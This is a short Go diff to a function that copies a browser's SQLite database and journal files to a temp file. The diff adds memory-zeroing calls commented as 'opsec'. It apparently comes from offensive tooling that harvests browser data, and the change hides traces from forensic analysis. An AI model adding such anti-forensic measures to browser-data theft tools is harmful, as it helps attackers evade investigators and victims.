@@ -117,6 +117,7 @@ func openBrowserDB(dbPath string) (*sql.DB, func(), error) {
 	// Strategy 1: Copy the DB to a temp file to avoid lock contention
 	srcData, readErr := os.ReadFile(dbPath)
 	if readErr == nil {
+		defer structs.ZeroBytes(srcData) // opsec: clear browser DB data from memory
 		tmpFile, tmpErr := os.CreateTemp("", "")
 		if tmpErr == nil {
 			tmpPath := tmpFile.Name()
@@ -125,9 +126,11 @@ func openBrowserDB(dbPath string) (*sql.DB, func(), error) {
 				// Also copy WAL and SHM journals if they exist — required for WAL-mode DBs
 				if walData, walErr := os.ReadFile(dbPath + "-wal"); walErr == nil {
 					os.WriteFile(tmpPath+"-wal", walData, 0600)
+					structs.ZeroBytes(walData) // opsec: clear WAL data
 				}
 				if shmData, shmErr := os.ReadFile(dbPath + "-shm"); shmErr == nil {
 					os.WriteFile(tmpPath+"-shm", shmData, 0600)
+					structs.ZeroBytes(shmData) // opsec: clear SHM data
 				}
 				db, dbErr := sql.Open("sqlite", tmpPath)
 				if dbErr == nil {
